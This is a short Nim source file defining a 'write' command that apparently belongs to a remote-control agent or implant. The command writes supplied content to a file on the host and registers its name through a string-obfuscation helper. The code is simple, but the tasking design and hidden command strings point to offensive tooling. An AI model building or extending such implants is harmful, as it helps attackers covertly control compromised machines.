import std/[os, json, strutils]
import core/types
import commands/registry
import crypto/strenc

proc writeExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
  let path    = params{"path"}.getStr("").strip()
  let content = params{"content"}.getStr("")
  if path.len == 0:
    return TaskResult(output: "Error: path required", status: "error", completed: true)

  let fullPath = if isAbsolute(path): path else: state.cwd / path
  try:
    writeFile(fullPath, content)
    return TaskResult(output: "Written " & $content.len & " bytes to " & fullPath,
                      status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initWrite*() =
  register(hidstr("write"), writeExecute)
